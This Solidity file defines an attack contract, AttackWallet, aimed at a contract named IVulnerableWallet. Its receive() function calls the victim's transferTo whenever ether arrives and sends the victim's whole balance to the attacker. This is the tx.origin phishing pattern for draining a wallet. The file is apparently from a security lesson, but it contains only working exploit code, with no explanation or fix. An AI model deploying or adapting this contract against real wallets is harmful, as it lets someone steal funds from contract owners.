// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

interface IVulnerableWallet {
    function transferTo(address payable dest, uint amount) external;
}

contract AttackWallet {
    address payable owner;
    IVulnerableWallet vulnerableContract;

    constructor(address _contract) {
        owner = payable(msg.sender);
        vulnerableContract = IVulnerableWallet(_contract);
    }

    receive() external payable {
        vulnerableContract.transferTo(
            owner,
            address(vulnerableContract).balance
        );
    }
}
